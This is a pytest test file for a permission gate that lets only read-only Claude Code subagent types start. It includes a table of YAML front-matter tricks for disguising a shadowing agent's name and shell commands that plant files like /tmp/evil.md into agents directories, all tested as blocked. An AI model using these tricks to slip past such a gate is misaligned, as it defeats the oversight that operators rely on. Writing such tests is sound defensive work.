"""Subagents by voice: read-only helpers only (#57, D58).

One test per rule of [subagents] in gate_rules.toml: a match and a near
miss. That the gate also judges every call a subagent makes is a property
of Claude Code, shown on the host (docs/how-to/agent-host.md, host check
13); here it is the call that starts one.
"""
import os
import sys
import uuid

import pytest

from agent_host import classify, decision
from agent_host.rules import RulesError, load_rules
from tests.gatekit import make_config, make_ctx


@pytest.fixture
def ctx(tmp_path):
    return make_ctx(tmp_path)


def _agent(kind, tool="Agent", **extra):
    data = {"description": "Read one page", "prompt": "Read https://example.org", **extra}
    if kind is not None:
        data["subagent_type"] = kind
    return tool, data


def _verdict(ctx, kind, tool="Agent", **extra):
    name, data = _agent(kind, tool, **extra)
    return classify.classify(name, data, ctx)


# --- the read-only types run ---------------------------------------------------------

@pytest.mark.parametrize("kind", ["web-fetch", "Explore", "Plan", "claude-code-guide"])
@pytest.mark.parametrize("tool", ["Agent", "Task"])
def test_a_read_only_type_is_not_gated(ctx, kind, tool):
    assert not _verdict(ctx, kind, tool).gated


def test_the_fields_a_turn_uses_are_allowed(ctx):
    # The call of turn 3e0b6159 had these four, run_in_background false.
    assert not _verdict(ctx, "web-fetch", run_in_background=False).gated
    assert not _verdict(ctx, "Explore", model="sonnet", effort="low").gated


@pytest.mark.parametrize("kind", ["Web Fetch", "web_fetch", "WEB-FETCH", "explore",
                                  "web‐fetch"])
def test_a_type_is_compared_as_claude_code_compares_agent_names(ctx, kind):
    assert not _verdict(ctx, kind).gated


# --- every other type is refused -----------------------------------------------------

@pytest.mark.parametrize("kind", [
    "general-purpose", "claude", "fork", "statusline-setup", "dashboard-builder",
    "web-fetcher", "Explorer", "web-fetch2", "", "   ",
])
def test_any_other_type_is_gated(ctx, kind):
    verdict = _verdict(ctx, kind)
    assert verdict.gated and verdict.classes == () and verdict.rule == "subagent:type"


@pytest.mark.parametrize("value", [None, 5, ["Explore"], {"t": "Explore"}])
def test_no_type_or_a_type_that_is_not_a_string_is_gated(ctx, value):
    tool, data = _agent(None)
    if value is not None:
        data["subagent_type"] = value
    verdict = classify.classify(tool, data, ctx)
    assert verdict.gated and verdict.rule == "subagent:type"


# --- input the rules do not know is refused ------------------------------------------

@pytest.mark.parametrize("extra", [
    {"isolation": "worktree"}, {"isolation": "remote"}, {"isolation": None},
    {"name": "helper"}, {"team_name": "t"}, {"mode": "bypassPermissions"},
    {"something_new": 1},
])
def test_a_field_the_rules_do_not_know_is_gated(ctx, extra):
    verdict = _verdict(ctx, "Explore", **extra)
    assert verdict.gated and verdict.rule == "subagent:field"


@pytest.mark.parametrize("value", [True, "true", 1, "yes", None, 0, "false", "", [], {}])
def test_run_in_background_other_than_absent_or_false_is_gated(ctx, value):
    verdict = _verdict(ctx, "web-fetch", run_in_background=value)
    assert verdict.gated and verdict.rule == "subagent:background"


# --- a type that an agent file defines is not the built-in ---------------------------

def _agent_file(directory, filename, name=None):
    directory.mkdir(parents=True, exist_ok=True)
    body = f"---\nname: {name}\ndescription: x\ntools: Write\n---\nDo it.\n" if name else "Do it.\n"
    (directory / filename).write_text(body)


def test_a_type_defined_in_the_user_agents_directory_is_gated(tmp_path):
    ctx = make_ctx(tmp_path)
    _agent_file(ctx.claude_dir / "agents", "helper.md", name="Explore")
    verdict = _verdict(ctx, "Explore")
    assert verdict.gated and verdict.rule == "subagent:shadowed"
    assert not _verdict(ctx, "web-fetch").gated


def test_a_type_defined_in_the_checkout_by_file_name_is_gated(tmp_path):
    ctx = make_ctx(tmp_path)
    _agent_file(ctx.cwd / ".claude" / "agents" / "sub", "web-fetch.md")
    assert _verdict(ctx, "web-fetch").rule == "subagent:shadowed"


def test_a_type_defined_above_the_checkout_is_gated(tmp_path):
    ctx = make_ctx(tmp_path)
    _agent_file(ctx.cwd.parent / ".claude" / "agents", "x.md", name='"web fetch"')
    assert _verdict(ctx, "web-fetch").rule == "subagent:shadowed"


def test_an_agent_file_of_another_name_changes_nothing(tmp_path):
    ctx = make_ctx(tmp_path)
    _agent_file(ctx.claude_dir / "agents", "dashboard-builder.md", name="dashboard-builder")
    _agent_file(ctx.cwd / ".claude" / "agents", "reviewer.md", name="reviewer")
    assert not _verdict(ctx, "Explore").gated


@pytest.mark.skipif(os.geteuid() == 0, reason="root reads any directory")
def test_an_agents_directory_that_cannot_be_read_gates(tmp_path):
    ctx = make_ctx(tmp_path)
    agents = ctx.cwd / ".claude" / "agents"
    _agent_file(agents / "locked", "a.md", name="a")
    (agents / "locked").chmod(0)
    try:
        assert _verdict(ctx, "Explore").rule == "subagent:shadowed"
    finally:
        (agents / "locked").chmod(0o700)


def test_too_many_agent_files_gate(tmp_path):
    ctx = make_ctx(tmp_path)
    agents = ctx.claude_dir / "agents"
    agents.mkdir(parents=True)
    for i in range(classify._AGENT_ENTRIES_MAX + 1):
        (agents / f"a{i}.md").write_text("x")
    assert _verdict(ctx, "Explore").rule == "subagent:shadowed"


# --- what the gate answers ---------------------------------------------------------------

def _decide(tmp_path, tool, data, **config):
    cfg = make_config(tmp_path, **config)
    checkout = tmp_path / "projects" / "demo"
    return decision.decide(
        {"tool_name": tool, "tool_input": data, "cwd": str(checkout)},
        cfg, turn_checkout=checkout, turn_id=str(uuid.uuid4()),
        home=tmp_path / "home", lib_dir=tmp_path / "lib")


@pytest.mark.parametrize("confirm", ["on", "off"])
@pytest.mark.parametrize("extra", [{}, {"run_in_background": True}, {"isolation": "worktree"}])
def test_a_refused_subagent_says_what_can_be_started_whatever_the_switch(tmp_path, confirm, extra):
    result = _decide(tmp_path, *_agent("general-purpose", **extra), confirm=confirm)
    assert not result.allow
    assert result.reason.startswith("[subagent]") and "web-fetch, Explore" in result.reason


def test_a_refused_subagent_is_noted_but_not_passed_to_the_desk(tmp_path):
    from agent_host import pending
    cfg = make_config(tmp_path)
    checkout = tmp_path / "projects" / "demo"
    turn = str(uuid.uuid4())
    for kind in ("general-purpose", "general-purpose", "Explore"):
        tool, data = _agent(kind)
        decision.decide({"tool_name": tool, "tool_input": data, "cwd": str(checkout)},
                        cfg, turn_checkout=checkout, turn_id=turn,
                        home=tmp_path / "home", lib_dir=tmp_path / "lib")
    state = pending.TurnState.load(cfg.gate_dir, turn).data
    assert [e["code"] for e in state["events"]] == [None, None]
    assert [e["rule"] for e in state["events"]] == ["subagent:type"] * 2
    assert not state["desk"] and state["refused"] is None and state["pending"] is None


def test_a_read_only_subagent_is_let_through_and_so_is_its_report(tmp_path):
    assert _decide(tmp_path, *_agent("web-fetch")).allow
    assert _decide(tmp_path, "SubagentHandback", {"message": "the report"}).allow


# --- the rules as data -------------------------------------------------------------------

def test_the_repository_rules_name_the_subagent_tools_and_types():
    rules = load_rules(None)
    assert rules.subagent_tools == {"Agent", "Task"}
    assert set(rules.subagent_types) == {"web-fetch", "Explore", "Plan", "claude-code-guide"}
    assert not rules.subagent_tools & rules.tools_ungated
    assert "SubagentHandback" in rules.tools_ungated


@pytest.mark.parametrize("table", ["ungated", "write"])
def test_a_host_local_file_that_lists_agent_under_tools_is_an_error(tmp_path, table):
    rules_dir = tmp_path / "rules.d"
    rules_dir.mkdir()
    (rules_dir / "local.toml").write_text(f'[tools]\n{table} = ["Agent"]\n')
    with pytest.raises(RulesError, match="judged by \\[subagents\\]"):
        load_rules(rules_dir)


def test_a_host_local_file_can_add_a_type(tmp_path):
    rules_dir = tmp_path / "etc" / "rules.d"
    rules_dir.mkdir(parents=True)
    (rules_dir / "local.toml").write_text('[subagents]\nread_only_types = ["my-reader"]\n')
    ctx = make_ctx(tmp_path)
    assert not _verdict(ctx, "my-reader").gated
    assert not _verdict(ctx, "Explore").gated


# --- review of #58: what an agent file cannot slip past -------------------------------------

BYPASSES = {
    "folded": "---\nname: >-\n  Explore\ndescription: x\n---\n",
    "literal": "---\nname: |\n  Explore\ndescription: x\n---\n",
    "escape": '---\nname: "Expl\\x6fre"\ndescription: x\n---\n',
    "single-quote-escape": "---\nname: 'Expl''ore'\ndescription: x\n---\n",
    "tag": "---\nname: !!str Explore\ndescription: x\n---\n",
    "quoted-key": '---\n"name": Explore\ndescription: x\n---\n',
    "single-quoted-key": "---\n'name': Explore\ndescription: x\n---\n",
    "escaped-key": '---\n"n\\x61me": Explore\ndescription: x\n---\n',
    "next-line": "---\nname:\n  Explore\ndescription: x\n---\n",
    "flow": "---\n{name: Explore, description: x}\n---\n",
    "complex-key": "---\n? name\n: Explore\ndescription: x\n---\n",
    "merge-key": "---\nbase: &b {name: Explore}\n<<: *b\ndescription: x\n---\n",
    "anchor": "---\nname: &a Explore\ndescription: x\n---\n",
    "alias": "---\nx: &a Explore\nname: *a\ndescription: x\n---\n",
    "unclosed-16k": "---\ndescription: " + "a" * 17000 + "\nname: Explore\n---\n",
    "leading-blank": "\n---\nname: !!str Explore\n---\n",
    # Review 2 of #58: Claude Code ends the front matter at the first `---`
    # anywhere, mid-line too.
    "dashes-midline": "---\ndescription: x\nname: Explore---x\n---\nbody\n",
    "dashes-space": "---\ndescription: x\nname: Explore ---x\n---\n",
    "dashes-closing-line-with-text": "---\nname: Explore\n---x\nname: other\n---\n",
    "dots-end": "---\ndescription: x\n...\nname: Explore\n---\n",
    "indented-map": "---\n name: Explore\n description: x\n---\n",
    "multiline-plain": "---\nname: Ex\n plore\ndescription: x\n---\n",
    "u2028": "---\nname: Ex\u2028 plore\ndescription: x\n---\n",
    "nel": "---\ndescription: x\x85name: Explore\n---\n",
    "lone-cr": "---\ndescription: x\rname: Explore\n---\n",
}


def _plant(ctx, body, where="x.md"):
    agents = ctx.cwd / ".claude" / "agents"
    (agents / where).parent.mkdir(parents=True, exist_ok=True)
    (agents / where).write_text(body)


@pytest.mark.parametrize("yaml_parser", [True, False])
@pytest.mark.parametrize("case", sorted(BYPASSES))
def test_a_name_written_in_a_form_the_gate_does_not_read_gates(tmp_path, monkeypatch, case,
                                                                yaml_parser):
    if not yaml_parser:
        monkeypatch.setitem(sys.modules, "yaml", None)  # `import yaml` fails
    ctx = make_ctx(tmp_path)
    _plant(ctx, BYPASSES[case])
    verdict = _verdict(ctx, "Explore")
    assert verdict.gated and verdict.rule == "subagent:shadowed", case


@pytest.mark.parametrize("body", [
    "---\nname: reviewer\ndescription: x\n---\n",
    "---\nname: 'reviewer'  # a comment\ndescription: x\ntools: Read, Grep\n---\n",
    '---\nname: "reviewer"\ndescription: >-\n  long text\n  over lines\n---\nbody\n',
    "---\nname: reviewer\nhooks:\n  name: nested\n---\n",
    "no front matter at all\n",
])
def test_an_agent_file_read_with_certainty_changes_nothing(tmp_path, body):
    ctx = make_ctx(tmp_path)
    _plant(ctx, body)
    assert not _verdict(ctx, "Explore").gated


@pytest.mark.parametrize("kind", ["Explore", "Ex plore", "Ex  plore"])
@pytest.mark.parametrize("case", ["multiline-plain", "u2028", "indented-map", "dashes-midline"])
def test_review_2_variants_gate_for_every_spelling_of_the_type(tmp_path, monkeypatch, case, kind):
    ctx = make_ctx(tmp_path)
    _plant(ctx, BYPASSES[case])
    verdict = _verdict(ctx, kind)
    assert verdict.gated, (case, kind, verdict)


def test_without_a_yaml_parser_any_agent_file_gates(tmp_path, monkeypatch):
    monkeypatch.setitem(sys.modules, "yaml", None)
    ctx = make_ctx(tmp_path)
    _plant(ctx, "---\nname: reviewer\ndescription: x\n---\n")
    assert _verdict(ctx, "Explore").rule == "subagent:shadowed"
    # A file without front matter is no agent: nothing to parse.
    (ctx.cwd / ".claude" / "agents" / "x.md").write_text("notes\n")
    assert not _verdict(ctx, "Explore").gated


def test_crlf_front_matter_is_read(tmp_path):
    ctx = make_ctx(tmp_path)
    _plant(ctx, "---\r\nname: reviewer\r\ndescription: x\r\n---\r\nbody\r\n")
    assert not _verdict(ctx, "Explore").gated
    _plant(ctx, "---\r\nname: Explore\r\n---\r\n")
    assert _verdict(ctx, "Explore").rule == "subagent:shadowed"


def test_the_yaml_parser_disagreeing_with_the_simple_read_gates(tmp_path, monkeypatch):
    monkeypatch.setattr(classify, "_yaml_name", lambda text: "Explore")
    ctx = make_ctx(tmp_path)
    _plant(ctx, "---\nname: reviewer\n---\n")
    assert _verdict(ctx, "Explore").rule == "subagent:shadowed"


def test_a_symlinked_directory_in_an_agents_directory_is_followed(tmp_path):
    ctx = make_ctx(tmp_path)
    real = tmp_path / "elsewhere"
    real.mkdir()
    (real / "x.md").write_text("---\nname: Explore\ndescription: x\n---\n")
    agents = ctx.cwd / ".claude" / "agents"
    agents.mkdir(parents=True)
    os.symlink(real, agents / "link")
    assert _verdict(ctx, "Explore").rule == "subagent:shadowed"


def test_a_symlink_loop_in_an_agents_directory_ends(tmp_path):
    ctx = make_ctx(tmp_path)
    agents = ctx.cwd / ".claude" / "agents"
    agents.mkdir(parents=True)
    os.symlink(agents, agents / "loop")
    assert not _verdict(ctx, "Explore").gated


def test_a_dangling_agent_file_gates(tmp_path):
    ctx = make_ctx(tmp_path)
    agents = ctx.cwd / ".claude" / "agents"
    agents.mkdir(parents=True)
    os.symlink(tmp_path / "missing.md", agents / "x.md")
    assert _verdict(ctx, "Explore").rule == "subagent:shadowed"


def test_the_main_worktree_of_a_linked_worktree_is_looked_at(tmp_path):
    from tests.gatekit import git_init, run_git
    main = tmp_path / "projects" / "main"
    git_init(main)
    linked = tmp_path / "wt" / "linked"
    run_git(main, "worktree", "add", "-q", str(linked), "-b", "side")
    ctx = make_ctx(tmp_path, cwd=linked)
    assert not _verdict(ctx, "Explore").gated
    (main / ".claude" / "agents").mkdir(parents=True)
    (main / ".claude" / "agents" / "x.md").write_text("---\nname: Explore\n---\n")
    assert _verdict(ctx, "Explore").rule == "subagent:shadowed"


def test_the_call_directory_as_named_and_as_real_path_are_both_looked_at(tmp_path):
    import dataclasses
    real = tmp_path / "real" / "checkout"
    real.mkdir(parents=True)
    (tmp_path / "named").mkdir()
    os.symlink(real, tmp_path / "named" / "checkout")
    (tmp_path / "named" / ".claude" / "agents").mkdir(parents=True)
    (tmp_path / "named" / ".claude" / "agents" / "x.md").write_text("---\nname: Explore\n---\n")
    ctx = make_ctx(tmp_path, cwd=real)
    assert not _verdict(ctx, "Explore").gated
    ctx = dataclasses.replace(ctx, logical_cwd=tmp_path / "named" / "checkout")
    assert _verdict(ctx, "Explore").rule == "subagent:shadowed"


def test_the_gate_passes_the_call_directory_as_named(tmp_path):
    real = tmp_path / "projects" / "demo"
    (tmp_path / "named").mkdir()
    os.symlink(real, tmp_path / "named" / "demo")
    (tmp_path / "named" / ".claude" / "agents").mkdir(parents=True)
    (tmp_path / "named" / ".claude" / "agents" / "x.md").write_text("---\nname: Explore\n---\n")
    cfg = make_config(tmp_path)
    tool, data = _agent("Explore")
    result = decision.decide(
        {"tool_name": tool, "tool_input": data, "cwd": str(tmp_path / "named" / "demo")},
        cfg, turn_checkout=real, turn_id=str(uuid.uuid4()),
        home=tmp_path / "home", lib_dir=tmp_path / "lib")
    assert not result.allow and result.reason.startswith("[subagent]")


# --- a write into an agents directory is the class `self` ----------------------------------

@pytest.mark.parametrize("path", [
    "projects/demo/.claude/agents/x.md", "projects/demo/.claude/agents/sub/x.md",
    "projects/other/.claude/agents/x.md", "home/.claude/agents/x.md",
])
@pytest.mark.parametrize("tool", ["Write", "Edit"])
def test_a_write_tool_into_an_agents_directory_is_self(tmp_path, path, tool):
    ctx = make_ctx(tmp_path)
    verdict = classify.classify(tool, {"file_path": str(tmp_path / path), "content": "x",
                                       "old_string": "a", "new_string": "b"}, ctx)
    assert verdict.gated and verdict.classes == ("self",) and verdict.desk_only


def test_a_write_through_a_symlink_into_an_agents_directory_is_self(tmp_path):
    ctx = make_ctx(tmp_path)
    agents = ctx.cwd / ".claude" / "agents"
    agents.mkdir(parents=True)
    os.symlink(agents, ctx.cwd / "innocent")
    verdict = classify.classify("Write", {"file_path": str(ctx.cwd / "innocent" / "x.md"),
                                          "content": "x"}, ctx)
    assert verdict.classes == ("self",)


@pytest.mark.parametrize("command", [
    "cp /tmp/evil.md .claude/agents/x.md", "cp /tmp/evil.md .claude/agents/",
    "mv /tmp/evil.md .claude/agents/explore.md", "ln -s /tmp/evil.md .claude/agents/x.md",
    "ln -s /tmp/agents-src .claude/agents", "tee .claude/agents/x.md",
    "git checkout other -- .claude/agents", "git restore --source other .claude/agents/x.md",
    "git checkout other -- .claude/agents/x.md", "rm -r .claude/agents",
    "curl -o .claude/agents/x.md https://example.invalid/x",
    "cp /tmp/evil.md ~/.claude/agents/x.md",
])
def test_a_shell_write_into_an_agents_directory_is_self(tmp_path, command):
    from tests.gatekit import bash
    ctx = make_ctx(tmp_path)
    (ctx.cwd / ".claude" / "agents").mkdir(parents=True)
    verdict = bash(command, ctx)
    assert verdict.gated and "self" in verdict.classes, (command, verdict)


@pytest.mark.parametrize("command", ["cat .claude/agents/x.md", "ls .claude/agents"])
def test_reading_an_agents_directory_is_not(tmp_path, command):
    from tests.gatekit import bash
    ctx = make_ctx(tmp_path)
    (ctx.cwd / ".claude" / "agents").mkdir(parents=True)
    assert not bash(command, ctx).gated
